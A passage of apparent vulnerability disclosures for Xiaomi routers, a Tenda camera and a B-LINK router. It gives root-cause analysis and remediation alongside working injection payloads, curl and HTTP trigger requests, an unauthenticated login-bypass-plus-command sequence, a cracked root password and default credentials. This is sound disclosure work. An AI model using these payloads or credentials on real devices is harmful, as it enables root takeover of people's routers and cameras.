Supporting runtime observations recorded in the package (all from instrumented execution of the real bytecode under `qemu-arm-static`): feeding the probe value `ZQINJ'"$\`` through all handlers of ten `luci.controller.api.*` controllers showed the value reaching constructed commands unmodified in 22 handler/parameter combinations — the signature of missing escaping calls; and the `_setMacFilter` sink was verified to escape `'`, `"`, `` ` ``, `$`, `\` and therefore excluded as non-vulnerable.

## Impact

- An authenticated attacker obtains arbitrary command execution as **root** on the router.
- Exposure of stored Wi-Fi passwords and full router configuration, exfiltration of WAN credentials, manipulation of DNS/forwarding rules, persistent backdoor implantation, or device bricking.
- The same unescaped template pattern exists in six additional tunnel constants (`thrifttunnel 0/1/6/7/8`, `tunneltool`) reachable through the same `exec()` helper, enlarging the attack surface of a single fix point.

## Remediation Suggestions

1. **Stop assembling command lines with `string.format`.** In `XQConfigs.exec()`, execute helper programs with an argument vector so the shell never participates in parsing and quoting rules become moot:

```lua
-- vulnerable
os.execute(string.format(THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER, payload))
-- fixed
local exe = "/usr/bin/thrifttunnel"
local ok, err = os.execute({ exe, "2", payload })
```

If this Lua build's `os.execute` does not accept an argument table, use `posix.fork`/`posix.execv`, or write the payload to a file and pass the file name — ensuring the payload never becomes part of a command line.

2. **Escape every value when the shell is unavoidable.** Apply the firmware's existing escaping helper — the one `_setMacFilter` already uses — uniformly at the seven tunnel call sites (offsets 0x30dc, 0x3115, 0x3159, 0x3232, 0x3269, 0x32a4, 0x32ce), preferring POSIX single-quote escaping (`'` → `'\''`) over the error-prone backslash style demonstrated in this report.
3. **Centralize protection in `XQConfigs.exec()`.** Because `exec()` is the common convergence point for all tunnel constants and `TUNNEL_TOOL`, make it refuse to construct command lines containing `%s` substitutions of untrusted data and migrate such callers to the argument-vector API. Add a unit test asserting that `exec()` rejects or escapes payloads containing single quotes, preventing regression across all channels at once.
4. **Constrain tunnel payloads by data structure.** Smart-home tunnel commands carry structured data (base64/JSON-encoded controller requests); validate with `XQFunction.validJsonParam` (already imported by this controller) and decode before use, so arbitrary strings never reach a command line.
5. **Add CSRF protection to the management interface.** The endpoint is reachable under an authenticated session; CSRF request validation raises the exploitation bar and protects the other tunnel constants from session-riding attacks as well.
6. **Add regression checks to the firmware build pipeline.** Fail the build when a shell format string (`sh -c`, `os.execute`, `io.popen`) receives a value originating from `luci.http.formvalue()`, and re-test all seven tunnel constants after the fix.

## References

- Firmware download (as referenced in the audit package): <https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rd18/miwifi_rd18_firmware_05f43_1.0.91.bin>

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Xiaomi RAX3000M (RD15) 1.0.87: sysapi macfilterctl rulename Lua Code Injection (Authenticated, Root RCE)
content:
# Xiaomi RAX3000M (RD15) 1.0.87: sysapi macfilterctl rulename Lua Code Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **CWE-95**: Improper Neutralization of Directives in Dynamically Evaluated Code ("Eval Injection") — Lua `loadstring` code injection, chained into OS command execution
- **CWE-77 / CWE-78**: OS Command Injection (the injected Lua expression calls `os.execute`)
- Vulnerability type: Code injection / command injection in the MAC filter management chain
- Severity: Critical

## Affected Product

| Item | Value |
| --- | --- |
| Vendor | Xiaomi |
| Product | Xiaomi Router RAX3000M |
| Model | RAX3000M, hardware code RD15 |
| Firmware filename & version | `miwifi_rd15_firmware_0321a_1.0.87.bin` — ROM 1.0.87 / HARDWARE RD15 / LINUX 5.4 / CHANNEL release / ROOTTYPE Official (SHA-256 `cb2d7e40a74c33439fe61e78f1c2c08bf4effdb6617214118f3da783fd7a5c0a`, MD5 `7de36dad316ed26eb067badf7480321a`, 28,836,864 bytes) |
| Severity | Critical |
| Component | `/usr/sbin/sysapi` (MAC filter management entry, `macfilter` subcommand) and `/usr/sbin/macfilterctl` (Lua rule-dispatch script); exposed through the `/api/xqsystem/mac_filter_rule` rule-name field (`name`/`rulename`) |

Audited file hashes: `b2c4680b...4f01a` = `usr/sbin/sysapi`; `8b7add89...f2d` = `usr/sbin/macfilterctl` (no firmware byte was modified by the PoC).

## Vulnerability Description

The Xiaomi router firmware implements MAC filter (blacklist/whitelist) rule management as a two-layer shell → Lua chain:

```text
Web/APP management API /api/xqsystem/mac_filter_rule
  └─> /usr/sbin/sysapi macfilter update mac=xx:xx:xx:xx:xx:xx lan=yes rulename=<rule name>
      └─> assemble Lua table constructor string {mac='…',wan='…',lan='…',admin='…',rulename='<rule name>'}
          └─> apply_firewall()  →  lua /usr/sbin/macfilterctl set "<the string above>"
              └─> macfilterctl: loadstring("return "..arg[2])()   ← evaluation sink
```

The rule-name field `rulename` is the only fully user-controlled free-text field in this chain. After reading it, `sysapi` performs only a "uppercase → lowercase" conversion — no single-quote escaping, no character whitelist, no length validation — and then embeds it into a Lua string with hardcoded single-quote delimiters. `macfilterctl` prefixes the whole string with `return` and hands it to `loadstring()` for compilation and execution. Because a Lua single-quoted string can be closed early with `'` and followed by `..` (string concatenation with an arbitrary expression), an attacker only needs to write

```text
zz'..os.execute('/usr/bin/id')..'zz
```

as the rule name, and the evaluated string becomes:

```lua
return {mac='aa:bb:cc:dd:ee:ff',wan='no',lan='yes',admin='yes',rulename='zz'..os.execute('/usr/bin/id')..'zz'}
```

The `..` concatenation inside the table constructor executes at construction time, so `os.execute()` is invoked.

**Trigger condition:** calling the MAC filter rule add/update interface with a rule name. The rule name is a user-definable display field directly exposed in the real web management plane and the Mi Home app's "MAC filter" page. The process runs as root (`sysapi` invokes the firmware's own `/usr/bin/lua` directly as root), so injected code inherits root privileges.

**Impact scope:** root, unconditionally, no secondary privilege escalation required; arbitrary command execution (process creation, arbitrary file read/write, iptables rewrite, reading `/etc/shadow` and cloud/local keys, etc.). The IP filter chain (`sysapi:226` reads `ip_rulename`, `sysapi:729` assembles the string) carries the same defect at the code level but is unreachable in firmware 1.0.87: `apply_ip_firewall` (sysapi:45-53) only calls `/usr/sbin/ipfilterctl` or `/usr/sbin/ipv6filterctl`, and neither script exists in this image's rootfs (`find -name '*filterctl*'` only finds `./usr/sbin/macfilterctl`). The IP filter chain is therefore recorded as a dormant same-origin defect.

## Root Cause Analysis

**Taint source (parameter read).** `./poc_work/squashfs-root/usr/sbin/sysapi:118-119` — the argument loop of the `macfilter` subcommand:

```sh
rulename=$(echo ${i#*=} | tr "[A-Z]" "[a-z]")
```

Only case conversion; the raw value (including `'`, `..`, `.`) is stored unchanged in the shell variable. In the same script, the MAC address field is only read and never participates in downstream string concatenation — `rulename` is the only free-text field spliced into a Lua expression.

**Concatenation point.** `sysapi:600` (inside `updaterule()`), after the uci batch successfully writes the MAC rule:

```sh
apply_firewall set "{mac='$mac',wan='$wan',lan='$lan',admin='$admin',rulename='$rulename'}"
```

The whole string sits inside double quotes, but the single quotes flanking `rulename` in the Lua table constructor are hardcoded — a single `'` supplied by the attacker closes the string early and allows arbitrary Lua expressions to follow.

**Invocation point.** `sysapi:38-41`:

```sh
apply_firewall() { ... lua /usr/sbin/macfilterctl "$@"; }
```

**Evaluation sink.** `./poc_work/squashfs-root/usr/sbin/macfilterctl:713-717`, the `arg[1]=="set"` branch:

```lua
if arg[1] == "set" then
    local tmparg = arg[2]
    if tmparg and tmparg ~= "" then
      local macpermission= {}
      macpermission[1]=assert(loadstring("return "..tmparg))()
      setRule(mt, macpermission)
```

The `return` prefix is concatenated directly with the user-controlled `tmparg` and compiled by `loadstring` — a textbook Lua code injection. The subsequent `setRule(mt, macpermission)` merely consumes the injection result; the injection happens at evaluation time.

**Privilege.** `sysapi:41` invokes `/usr/bin/lua` (Lua 5.1.5) directly as root; `os.execute`/`io.popen` available in the `loadstring` environment inherit the daemon's root privileges — injected code lands as arbitrary system commands with no secondary escalation.

**Cross-verification.** The IP filter chain uses exactly the same construction at `sysapi:226` (`ip_rulename=$(echo ${i#*=} | tr "[A-Z]" "[a-z]")`) and `sysapi:729` (`apply_ip_firewall set "{ipaddr='$ipaddr',…,rulename='$ip_rulename'}"`) — the missing-escaping flaw is systemic in the `sysapi` concatenation layer, not an isolated case; but that chain is unreachable in this firmware because the evaluation scripts are absent.

## Exploitation

### Preconditions

- Access to the MAC filter rule management interface (`/api/xqsystem/mac_filter_rule`) with a management session; the rule name is directly editable in the web admin / Mi Home app MAC filter page.
- The payload must be lowercase (`sysapi:119` lowercases the parameter; the payloads below are already lowercase).

### Steps (emulation verification)

1. Verify the firmware hash and unpack: `sha256sum ./miwifi_rd15_firmware_0321a_1.0.87.bin` → `cb2d7e40...5c0a`; binwalk locates the UBI erase-count header at offset 752; `ubireader_extract_images` and `unsquashfs -d ./poc_work/squashfs-root ./poc_work/carve/img/img-1758036052_vol-ubi_rootfs.ubifs` produce the rootfs.
2. Show the firmware version: `cat ./poc_work/squashfs-root/usr/share/xiaoqiang/xiaoqiang_version` prints `option ROM '1.0.87'`, `option HARDWARE 'RD15'`, `option LINUX '5.4'`, `option CHANNEL 'release'`.
3. Start the emulation (`bash ./run_emulation.sh`): register the binfmt_misc qemu-arm handler, mount proc/dev/sys/tmp inside the chroot, and use the firmware's own `uci` to populate the macfilter mode sections (the equivalent state of a router with MAC filtering enabled — without them `macfilterctl` exits early at `iterOutTable("macfilter","mode")[1]`). Self-check prints `armv7l` and `Lua 5.1.5`, then `Emulation ready.`
4. Start the target: a local lab stand-in API (`poc_harness.py`) listens on `127.0.0.1:18080` and forwards the `name` parameter verbatim to the in-chroot firmware command — the equivalent of `/api/xqsystem/mac_filter_rule`:

```sh
chroot ./poc_work/squashfs-root /usr/sbin/sysapi macfilter update \
    mac=aa:bb:cc:dd:ee:ff wan=no lan=yes admin=yes pridisk=no \
    "rulename=zz'..os.execute('/usr/bin/id')..'zz"
```

5. Trigger the PoC:

```sh
curl -s --get --data-urlencode "name=zz'..os.execute('/usr/bin/id')..'zz" \
    'http://127.0.0.1:18080/api/xqsystem/mac_filter_rule'
# second case: write a file then read it back
curl -s --get --data-urlencode "name=zz'..os.execute('/bin/sh -c \"id > /tmp/pwned_macfilter_rce.txt\"')..'zz" \
    'http://127.0.0.1:18080/api/xqsystem/mac_filter_rule'
```

On a real device, the same payload is submitted through the MAC filter rule management interface:

```http
POST /api/xqsystem/mac_filter_rule HTTP/1.1
Content-Type: application/json
Cookie: <authenticated admin session>

{"mac":"aa:bb:cc:dd:ee:ff","wan":0,"lan":1,"admin":1,"pridisk":0,"name":"zz'..os.execute('/usr/bin/id')..'zz"}
```

### Expected output

The injected `/usr/bin/id` executes as root in the emulated target:

```text
uid=0(root) gid=0(root) groups=0(root),1000
```

Reading the dropped file back confirms arbitrary command execution:

```text
$ chroot ./poc_work/squashfs-root /bin/sh -c 'cat /tmp/pwned_macfilter_rce.txt'
uid=0(root) gid=0(root) groups=0(root),1000
```

The PoC prints `VERDICT SUCCESS` (exit code 0). Note: after the injection, `setRule()` may throw `/usr/sbin/macfilterctl:86: attempt to index local 'uconn' (a nil value)` because the emulation environment lacks conntrack userspace state — collateral noise occurring after the injection, which does not affect the conclusion that the code was executed; likewise `cat: can't open '/proc/xiaoqiang/model'` is due to the missing device-model pseudo-file in the rootfs.

## Evidence

![Firmware hash verification and rootfs unpacking: sha256 matches expected value, binwalk UBI header offset 752, ubireader extraction and unsquashfs](MiRAX3000M_images/fig1.png)

Asset verification: the firmware SHA-256 matches the expected `cb2d7e40...5c0a`; the UBI header is carved at offset 752 and the `vol-ubi_rootfs` UBI volume is extracted to `poc_work/squashfs-root`.

![xiaoqiang_version: ROM '1.0.87', CHANNEL 'release', HARDWARE 'RD15', LINUX '5.4', build time Thu, 20 Mar 2025](MiRAX3000M_images/fig2.png)

Firmware version ground truth read from the unpacked rootfs (`usr/share/xiaoqiang/xiaoqiang_version`): ROM 1.0.87 on hardware RD15, release channel, Linux 5.4.

![chroot + qemu-arm-static emulation: binfmt_misc handler registered, armv7l, Lua 5.1.5, macfilter mode sections populated, guest target /usr/sbin/sysapi -> lua /usr/sbin/macfilterctl, API stand-in listening on 127.0.0.1:18080](MiRAX3000M_images/fig3.png)

Emulation environment readiness: the firmware's own Lua (`Lua 5.1.5`) runs under chroot, the macfilter mode configuration is populated with the firmware's own `uci`, and the MAC-filter management API stand-in listens on `127.0.0.1:18080`.

![PoC payloads and results: zz'..os.execute('/usr/bin/id')..'zz prints uid=0(root); second payload writes /tmp/pwned_macfilter_rce.txt which reads back uid=0(root)](MiRAX3000M_images/fig4.png)

Injection results: PoC-1's payload executes `/usr/bin/id` and its output `uid=0(root) gid=0(root) groups=0(root),1000` appears on stdout; PoC-2's payload redirects `id` into `/tmp/pwned_macfilter_rce.txt` inside the guest rootfs, which is then read back showing the same root identity — the injected Lua expression executed arbitrary commands as root.

## Impact

- Arbitrary command execution as **root** on the router, unconditionally and without secondary privilege escalation: process creation, arbitrary file read/write, iptables rule rewriting, extraction of `/etc/shadow` and cloud/local credentials.
- The rule name is a regular, user-facing field of the MAC filter page in both the web admin and the Mi Home app, so the exploit needs no unusual access beyond a management session.
- A dormant same-origin defect exists in the IP filter chain (`sysapi:226`/`sysapi:729`); it becomes exploitable the moment the vendor reintroduces the missing `ipfilterctl`/`ipv6filterctl` scripts and must be fixed together with the MAC filter chain.

## Remediation Suggestions

1. **Root-cause fix (preferred): stop evaluating argv as Lua source.** Rewrite `macfilterctl:713-717` to parse a fixed key-value format instead of concatenating `argv[2]` into `loadstring`, e.g. `local f={} for k,v in string.gmatch(tmparg, "([%w_]+)='([^']*)'") do f[k]=v end`; or change the calling protocol to per-argument passing (`lua /usr/sbin/macfilterctl set mac "$mac" wan "$wan" lan "$lan" admin "$admin" rulename "$rulename"`) with positional argv. After the fix, `loadstring` should only ever compile vendor-owned constants and never accept external input.
2. **Input filtering at `sysapi`.** After the existing `tr "[A-Z]" "[a-z]"` at `sysapi:118-119` and `:226`, add a whitelist: allow `rulename` only against `^[A-Za-z0-9_-]{1,32}$`; reject illegal input immediately with logging rather than writing it into uci or downstream concatenation. Escape single quotes in every concatenation point (e.g. `esc(){ printf "%s" "$1" | sed "s/'/'\\\\''/g"; }` applied to all Lua strings and uci values). Validate `mac` against `^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$` and `wan`/`lan`/`admin`/`pridisk` against `yes/no` enums.
3. **Fix the dormant same-origin defect together.** The IP filter chain has the identical construction at `sysapi:226`/`sysapi:729`; even though `ipfilterctl`/`ipv6filterctl` are absent in 1.0.87, remediate it in the same change so the vulnerability does not resurface when the scripts are restored. Audit all `apply_*` call sites in `sysapi` (`grep -n "apply_"`) for other user-controlled fields entering string concatenation.
4. **Defense in depth and verification.** Enforce session authentication on `/api/xqsystem/mac_filter_rule` and similar management APIs, add CSRF token validation and audit logging for MAC-filter update operations. Running `sysapi`/`macfilterctl` as root is a high-risk design — dispatch rule updates under a least-privilege account and expose root-only actions through a restricted IPC (unix socket + command whitelist). Regression-verify with the package PoC: the payload must be rejected, `uid=0(root)` must no longer appear, and the script must print `VERDICT FAILED`, while legitimate rule names (including Chinese characters/hyphens) must still be written to `/etc/config/macfilter` correctly.

## References

- Firmware download (as referenced in the audit package): <https://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rd15/miwifi_rd15_firmware_0321a_1.0.87.bin>
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ("Eval Injection") — <https://cwe.mitre.org/data/definitions/95.html>

## Discoverer

Vulnerability discovered by **JiuZero**.

title: Tenda CH7 V21.5.2.12: Kylin goform/ate Factory Test Interface OS Command Injection (Authenticated, Root RCE)
content:
# Tenda CH7 V21.5.2.12: Kylin goform/ate Factory Test Interface OS Command Injection (Authenticated, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- Vulnerability type: Command injection via the factory test (ATE) CGI interface
- Severity: High

## Affected Product

| Item | Value |
| --- | --- |
| Vendor | Tenda |
| Product | CH7 network camera (IPC) |
| Model | CH7 (OEM TDC01, hardware V1.0, chip XS_7302, sensor OS04L10) |
| Firmware filename & version | `US_CH7V1.0xs_V21.5.2.12_en+cn_TDC01(TDE01).bin` (inside `CH7软件升级V21.5.2.12.zip`, image MD5 `581503538706e930f8e174c39f4cd04c`, zip SHA-256 `a47ff0e2647424ebc9b736afa432d3b77425d8266fd90968359fe9947b93e30a`) — SWVersion=V21.5.2.12 |
| Severity | High |
| Component | `/opt/app/bin/Kylin` — `CAte::HandleCmd` (the `/goform/ate` CGI) |

`Kylin` is the main application: ARM32 EABI5 uClibc dynamically linked (`/lib/ld-uClibc.so.0`), stripped, 9188416 bytes, MD5 `51b078aab60aa177de2376e1ae015ce0`.

## Vulnerability Description

The Kylin main program of the Tenda CH7 camera firmware provides an ATE (Automated Test Equipment, factory test) CGI endpoint at `/goform/ate`. While processing ATE commands in `CAte::HandleCmd`, the program concatenates a user-supplied HTTP POST parameter value into a shell command line without any filtering and executes it with `popen`. Reconstructed from the instruction sequence at 0xb0ade—0xb0aee, the logic is equivalent to:

```c
snprintf(cmd, 0x80, "rtwpriv wlan0 efuse_file %s > /var/ate.log", user_value);
popen(cmd, "r");
```

After logging in to the device's management interface (the web login JavaScript `login.*.js` presets `username:"admin"` / `oldPassword:"admin123456"`, so the factory default password reaches the endpoint directly), an attacker can submit a parameter value containing command separators (`;`, `|`, `` ` ``, `$()` etc.). These characters enter the final shell command verbatim and are executed by `popen`, resulting in arbitrary system command execution with root privileges.

The vulnerability was verified by Unicorn single-function dynamic emulation: after injecting the payload `x; touch /tmp/pwned_cnvd; #`, the command handed to `popen` was `rtwpriv wlan0 efuse_file x; touch /tmp/pwned_cnvd; # > /var/ate.log` — the injection is confirmed.

## Root Cause Analysis

All addresses below were verified by disassembly of the delivered `./extract/Kylin` binary (address map in the package's `codemap.txt`).

**Web entry point.** Function 0xf936c is the HTTP request handler (Dahua WebSvr stack, `CWebSvrSession::process_http_req`). The request first passes an authentication callback (called through a vtable at 0xf93b2; failure returns immediately). When the conditions at 0xf940c—0xf9418 are met, 0xf941a loads the string `/goform/ate` (literal pool 0xf95ac → string at 0x7087b6) and 0xf941e calls `strcmp` (0x1ed34) against the request URI; a match (0) branches at 0xf9424 into the ATE command flow. This proves `/goform/ate` is a real, reachable web entry located behind authentication.

**Command dispatch.** `CAte::HandleCmd` sits at 0xb09e8. On entry it copies the HTTP-POST-derived parameter structure into the stack (loop at 0xb09ee—0xb0a04), then dispatches by command type: fixed commands `ifconfig wlan0 up` (0x6fa4c0), `rtwpriv wlan0 mp_start` (0x6fa500) are run via `popen` first (0xb0aa4, 0xb0abc, 0xb0ace), followed by the efuse command carrying the user parameter.

**Command construction (primary sink), 0xb0ad8—0xb0aee:**

```asm
0xb0ad8  ldr r5, [pc, #0x114]   ; literal 0xb0bf0 = 0x8b9974 (global ptr holding user ATE parameter)
0xb0ada  blx (0x1e7c0, pclose)  ; close previous popen stream
0xb0ade  ldr r2, [pc, #0x114]   ; literal 0xb0bf4 = 0x6fa683 → "rtwpriv wlan0 efuse_file %s > /var/ate.log"
0xb0ae0  movs r1, #0x80
0xb0ae2  add r0, sp, #0xc0      ; destination buffer
0xb0ae4  ldr r3, [r5]           ; user-controlled string
0xb0ae6  blx (0x1e200, snprintf)
0xb0aea  ldr r1, [pc, #0xfc]    ; mode "r" (0x7c194b)
0xb0aee  blx (0x1dedc, popen)   ; ==> command injection
```

**Second construction site.** At 0xb4910 the format string `iperf3 -c %s -i 1 -t 10` (0x6fb44d) is filled via `snprintf` and executed through the call at 0xb491c → 0x53f05c, likewise unfiltered.

Because the `%s` argument is never sanitized, the user-submitted string enters the shell verbatim; inserting `; touch /tmp/pwned_cnvd` injects a new command executed with root privileges.

## Exploitation

### Preconditions

- Reachability of the camera's web management interface.
- A session obtained by logging in through the web UI (the login page presets factory default credentials `admin`/`admin123456`, which reach this endpoint directly).
- Access to `POST /goform/ate` with a crafted parameter value.

### Steps

1. Verify and unpack the firmware (audit-side steps): `md5sum ./CH7软件升级V21.5.2.12.zip` then `bash ./extract_firmware.sh` — the script unzips the upgrade package, splits the vendor header + embedded ZIP of the firmware bin, strips each partition's 64-byte vendor header, extracts the five JFFS2 partitions with jefferson (romfs/user/web/custom/slave), and produces `./extract/Kylin` plus `./extract/fw_version.txt`.
2. Confirm the firmware version: `cat ./extract/fw_version.txt`, `strings ./extract/Kylin | grep -E "^SWVersion=$|^BuildDate=$|^ChipType=$|TDC01|HZ_IPC_release"` — shows `TD0101XS_7302`, `V21.5.2.12`, `TDC01`, build path `HZ_IPC_release/CH7-WCAV1.0_release`, confirming the affected version.
3. Start the target: `bash ./run_emulation.sh` merges the rootfs (romfs as base, user → /opt/app, web → /opt/web, custom → /opt/custom) and runs Kylin under `qemu-arm-static` in a chroot. In testing, boot reached `main()` printing the version banner (`Application Version 4.1.2`, `time: Jan 18 2024 16:01:05`) and device info (`productName CH7 ... oem TDC01 hwVersion V1.0 swVersion V21.5.2.12 ... sensorType OS04L10`), then aborted at the media-library assertion `../../Src/hi35xx/Zn_Common.c: 220: GetSystemInfor: Assertion '0' failed` (sensor/ISP hardware dependency that qemu-user cannot satisfy). The command construction/execution fragment was therefore verified with Unicorn single-function emulation (0xb0ade—0xb0aee).
4. Trigger the PoC.

### PoC execution (Unicorn single-function emulation, `poc_ate_cmd_injection.py`)

The script locates `./extract/Kylin` automatically, maps its `.text/.rodata/.data` (LOAD1: vaddr 0x10000/size 0x8759e0; LOAD2: vaddr 0x896000/filesz 0x4ce00/memsz 0x24f87c), maps the user-controlled string to the global 0x8b9974, emulates the `snprintf`+`popen` key fragment of `CAte::HandleCmd` (0xb0ade—0xb0aee), and hooks `snprintf`/`popen` to capture the final shell command.

Benign input:

```sh
python3 ./poc_ate_cmd_injection.py "wifi_efuse.bin"
```

```text
snprintf command: 'rtwpriv wlan0 efuse_file wifi_efuse.bin > /var/ate.log'
popen_command   : 'rtwpriv wlan0 efuse_file wifi_efuse.bin > /var/ate.log'
popen_mode      : 'r'
```

Malicious input (command injection):

```sh
python3 ./poc_ate_cmd_injection.py "x; touch /tmp/pwned_cnvd; #"
```

```text
snprintf command: 'rtwpriv wlan0 efuse_file x; touch /tmp/pwned_cnvd; # > /var/ate.log'
popen_command   : 'rtwpriv wlan0 efuse_file x; touch /tmp/pwned_cnvd; # > /var/ate.log'
popen_mode      : 'r'
VERDICT: CONFIRMED - unfiltered user input reaches popen() shell command;
         ';' inside payload is a shell command separator -> arbitrary command execution
```

The injected `; touch /tmp/pwned_cnvd` enters the shell command verbatim and is executed by `popen` — on the real device this runs with the root privileges of the Kylin process. An equivalent end-to-end HTTP exploit would be a POST to `/goform/ate` (behind the login session) whose ATE parameter value carries the same separators.

## Evidence

![extract_firmware.sh output: upgrade zip MD5, firmware bin (vendor header + embedded ZIP), partition images, JFFS2 extraction of 5 partitions, Kylin ELF identification (ARM32 uClibc stripped)](TCH7_images/fig1.png)

Firmware asset extraction: the bin header carries `TD0101XS_7302` / `V21.5.2.12`; the embedded ZIP contains the burn list `Install` and the partition images (u-boot, zImage-dtb, romfs/user/web/custom squash, slave jffs2); five partitions are extracted and `Kylin` is identified as an ELF 32-bit LSB ARM EABI5 executable, dynamically linked against uClibc, stripped.

![strings on extract/Kylin showing SWVersion=, BuildDate=, ChipType= placeholders and OEM marker TDC01 with HZ_IPC_release build paths](TCH7_images/fig2.png)

Version confirmation inside the main program: the `strings` scan surfaces the OEM marker `TDC01` and the `HZ_IPC_release/CH7-WCAV1.0_release` build paths alongside the `SWVersion=`/`ChipType=` key strings, corroborating the audited version (the emulation log additionally prints `swVersion V21.5.2.12` at runtime).

![PoC runs: benign input produces the clean rtwpriv command; malicious input x; touch /tmp/pwned_cnvd; # is captured verbatim in the popen command, VERDICT: CONFIRMED](TCH7_images/fig3.png)

Dynamic verification with the Unicorn harness: with benign input the captured `popen_command` is the intact `rtwpriv wlan0 efuse_file wifi_efuse.bin > /var/ate.log`; with the payload `x; touch /tmp/pwned_cnvd; #` the captured command contains the injected segment verbatim — `rtwpriv wlan0 efuse_file x; touch /tmp/pwned_cnvd; # > /var/ate.log` — and the harness prints `VERDICT: CONFIRMED`.

## Impact

- An attacker with a management session (reachable with the factory default password `admin`/`admin123456` preset in the login page) can execute arbitrary system commands with **root** privileges on the camera.
- Full device compromise typical for IPCs: firmware/configuration tampering, credential theft, network pivoting from the camera into the internal network, and turning the device into a surveillance/attack foothold.
- A second unfiltered sink (`iperf3 -c %s -i 1 -t 10` at 0xb4910) extends the same injection surface to other ATE operations.

## Remediation Suggestions

1. Strictly whitelist-validate every parameter that enters a shell command in `CAte::HandleCmd`; reject command separators (`;`, `|`, `&`, `` ` ``, `$()`, `${}`, newlines) and other shell metacharacters outright.
2. Replace `system`/`popen` string concatenation with shell-free APIs (`execvp` and similar), passing fixed commands such as `rtwpriv`/`iperf3` with argument arrays.
3. Add strong authentication and access control to the `/goform/ate` factory-test endpoint (administrators only, local/trusted segments only) and disable it by default in production builds.
4. Change the factory default password `admin`/`admin123456`, force a password change at first login, and eliminate the direct default-credential path to this endpoint.
5. Upgrade to the latest firmware version published by the vendor.

## References

- Firmware download (as referenced in the audit package): <https://static.tenda.com.cn/tdcweb/download/uploadfile/CH7-WCA/CH7%E8%BD%AF%E4%BB%B6%E5%8D%87%E7%BA%A7V21.5.2.12.zip>

## Discoverer

Vulnerability discovered by **JiuZero**.

title: B-LINK X26 (AC12) V1.0.1: lighttpd.cgi Blink Management API Unauthenticated OS Command Injection (Pre-Auth, Root RCE)
content:
# B-LINK X26 (AC12) V1.0.1: lighttpd.cgi Blink Management API Unauthenticated OS Command Injection (Pre-Auth, Root RCE)

## Vulnerability Type / CWE

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection") — chained with an authentication flaw (CWE-287, Improper Authentication) that makes it pre-auth
- Vulnerability type: Unauthenticated remote command execution (empty-credential login bypass + `bs_SetCmd` command injection)
- Severity: Critical

## Affected Product

| Item | Value |
| --- | --- |
| Vendor | B-LINK (必联) |
| Product | X26 (AC12) wireless router |
| Model | X26 (AC12) |
| Firmware filename & version | `X26(AC12)_V1.0.1_TFTP.zip` → `X26(AC12)-V1.0.1-20231221-upgrade.bin` — V1.0.1 (in-firmware version `WR-V36-1200M-28A13E-D-AC12,1.0.1`; upgrade zip SHA-256 `bf4ecdb6a187da537b19c700f76a080ba9187c4001a79a9106937167780ae690`, image SHA-256 `c480994ed4f7df253329482e6f41c318dcfcb1f22d58c47edbfbc877899f668e`) |
| Severity | Critical |
| Component | `www/cgi-bin/lighttpd.cgi` (Blink management API `loginauth` / `setcmd` endpoints) and `usr/lib/libblinkapi.so` (`bs_loginauth`, `bs_SetCmd`) |

## Vulnerability Description

The Blink management API of the B-LINK X26 (AC12) V1.0.1 firmware (CGI program `www/cgi-bin/lighttpd.cgi` plus `usr/lib/libblinkapi.so`) exposes a complete unauthenticated → command execution chain: an attacker with no credentials at all executes arbitrary commands as root on the router.

**Step 1 — authentication bypass (empty-credential login succeeds).** `bs_loginauth` reads the administrator account and password via `easy_uci_get_option_string("system", "routeusr")` and `easy_uci_get_option_string("system", "routepwd")`. The factory `/etc/config/system` contains no `config route` section at all (only `config system`, `config timeserver`, etc.), so both lookups fail and return empty strings. The code does not distinguish "lookup failed / empty value" and compares the password using the empty string; a login request with an empty username and an empty password is therefore judged successful, and the client receives a 32-hex-character session token. Runtime evidence (`vuln1-04-loginauth-stderr.log`):

```text
[easy_uci_get_option_string] Failed to find section: 'route'
```

**Step 2 — command injection (`bs_SetCmd` → `popen`).** The CGI parses the request body as JSON, looks up the `type` member in the API dispatch table (`api_table.json`, 124 entries: `loginauth` → 0x128ac `sym.bs_loginauth`, `setcmd` → 0xfd94 `sym.bs_SetCmd`). `sym.bs_SetCmd` takes the JSON `cmd` member, concatenates it into a command buffer with `strcat`, and hands it to `popen()` — no character filtering, whitelist, or escaping anywhere, equivalent to `/bin/sh -c` plus the attacker's command string.

A single unauthenticated HTTP request sequence therefore completes the whole path from "login" to "root command execution":

```http
POST /cgi-bin/lighttpd.cgi
{"type":"loginauth","platform":"0","user":"","pass":""}
→ reply contains "type":"loginauth" and "result":0 and issues a 32-hex session token

POST /cgi-bin/lighttpd.cgi
Header: Authorization: <issued token>
{"type":"setcmd","cmd":"id > /tmp/pwned_cnvd 2>&1"}
→ the command is executed by popen() via /bin/sh; the dropped file contains uid=0(root)
```

Impact: the attacker can run arbitrary system commands on the audited device (read configuration files, harvest session tokens, rewrite system configuration, plant backdoors, pivot into the LAN) without any password — a textbook unauthenticated RCE. If the management API is exposed on the WAN side or reachable within the LAN, the attack surface expands further.

**Additional confirmation — weak root password (cracked offline and login-capable).** The root password hash in the firmware rootfs `/etc/shadow` is the MD5crypt string `$1$ZvjIxpIk$O1X0HkvJuq4NEv5fDnsC5/`. Offline cracking with hashcat (`-m 500`, `rockyou-30000.rule` over a firmware-related wordlist `hq.txt`) recovered the plaintext `blinkadmin` (`hashcat-1.transcript`, potfile `hashcat.pot`). This plaintext matches the hardcoded backup-encryption password `blinkadmin` in `recover.cgi` (`strings ./rootfs/www/cgi-bin/recover.cgi` shows `openssl enc -d -aes256 -salt -k blinkadmin ...`), demonstrating the vendor reuses the same weak password across the firmware. Using the cracked plaintext, the emulated router's dropbear SSH service accepts a root login (`uid=0(root)`, see `login-blinkadmin-1.transcript`). Even if the management API authentication were hardened, an attacker could still try to log in as `root`/`blinkadmin` over SSH (`/etc/config/dropbear` ships with `RootPasswordAuth 'on'`).

## Root Cause Analysis

